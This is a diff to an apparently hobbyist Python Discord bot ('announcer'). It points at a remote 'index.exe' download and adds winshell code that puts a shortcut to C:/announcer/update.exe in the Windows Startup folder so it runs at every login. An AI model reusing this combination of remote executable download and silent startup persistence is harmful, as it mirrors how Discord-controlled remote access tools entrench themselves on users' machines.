@@ -5,7 +5,7 @@ import time
 import discord
 import asyncio
 import dotenv
-
+import winshell
 
 
 timeout = 1
@@ -14,7 +14,7 @@ connection = False
 intents = discord.Intents.default()
 client = discord.Client(intents=intents)
 channel_id = 1371637817058267139  # Replace with your channel ID
-token = os.getenv("Ethan").strip # Replace with your token
+token = os.getenv("Ethan") # Replace with your token
 
 # Try loading from the current working directory first
 loaded = dotenv.load_dotenv()
@@ -78,18 +78,18 @@ async def on_ready():
     url = "https://github.com/Plexisity/announcer/raw/main/index.exe"
     filename = "index.exe"
 
+    
+
     # Make C:/announcer/update.exe start on startup
     startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     shortcut_path = os.path.join(startup_path, "update.lnk")
-    if not os.path.exists(shortcut_path):
-        os.system(f'shortcut /f:"{shortcut_path}" /a:c /t:"C:/announcer/update.exe"')
-    # Create the shortcut
-    os.system(f'shortcut /f:"{shortcut_path}" /a:c /t:"C:/announcer/update.exe"')
-    # Check if the shortcut was created successfully
-    if os.path.exists(shortcut_path):
+    try:
+        with winshell.shortcut(shortcut_path) as shortcut:
+            shortcut.path = "C:/announcer/update.exe"
+            shortcut.description = "Announcer Update Script"
         print("Shortcut created successfully.")
-    else:
-        print("Failed to create shortcut.")
+    except Exception as e:
+        print(f"Failed to create shortcut: {e}")
 
     # Send a message to the channel
 
